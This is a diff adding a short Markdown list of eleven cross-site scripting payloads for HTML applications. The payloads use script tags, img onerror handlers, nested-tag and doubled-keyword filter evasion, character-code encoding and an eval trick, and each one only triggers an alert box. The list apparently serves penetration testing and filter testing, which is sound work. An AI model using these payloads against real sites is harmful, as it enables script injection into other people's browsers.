@@ -1,0 +1,13 @@
+# XSS in HTML Applications
+
+- `<script>alert('XSS')</script>`
+- `<scr<script>ipt>alert('XSS')</scr<script>ipt>`
+- `"><script>alert("XSS")</script>`
+- `"><script>alert(String.fromCharCode(88,83,83))</script>`
+- `<img src=x onerror=alert('XSS');>`
+- `<img src=x onerror=alert('XSS')//`
+- `<img src=x onerror=alert(String.fromCharCode(88,83,83));>`
+- `<img src=x oneonerrorrror=alert(String.fromCharCode(88,83,83));>`
+- `<img src=x:alert(alt) onerror=eval(src) alt=xss>`
+- `"><img src=x onerror=alert("XSS");>`
+- `"><img src=x onerror=alert(String.fromCharCode(88,83,83));>`
